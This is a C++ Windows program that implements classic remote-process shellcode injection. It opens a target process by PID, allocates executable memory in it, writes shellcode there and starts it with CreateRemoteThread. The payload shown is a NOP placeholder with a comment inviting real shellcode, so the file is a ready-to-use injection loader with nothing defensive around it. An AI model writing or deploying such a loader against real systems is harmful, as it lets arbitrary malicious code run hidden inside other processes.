#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// Function to get a handle to a process by its PID
HANDLE GetProcessHandle(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "[-] Failed to open process. Error: " << GetLastError() << std::endl;
    }
    return hProcess;
}

// Function to inject shellcode into a process
bool InjectShellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    // Get handle to target process
    HANDLE hProcess = GetProcessHandle(pid);
    if (hProcess == NULL) {
        return false;
    }

    // Allocate memory in the target process for the shellcode
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        std::cerr << "[-] Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Allocated memory at: " << remoteMemory << std::endl;

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcode.size(), NULL)) {
        std::cerr << "[-] Failed to write shellcode to target process memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Shellcode written to memory." << std::endl;

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Remote thread created successfully." << std::endl;

    // Wait for the thread to finish (optional)
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

int main() {
    DWORD pid;
    std::cout << "Enter the PID of the target process: ";
    std::cin >> pid;
    unsigned char shellcode[] = {
        0x90, 0x90, // NOP NOP (Example, replace with actual shellcode)
        // Insert your shellcode here
    };

    std::vector<unsigned char> shellcodeVec(shellcode, shellcode + sizeof(shellcode));

    if (InjectShellcode(pid, shellcodeVec)) {
        std::cout << "[+] Shellcode injection succeeded." << std::endl;
    } else {
        std::cerr << "[-] Shellcode injection failed." << std::endl;
    }

    return 0;
}
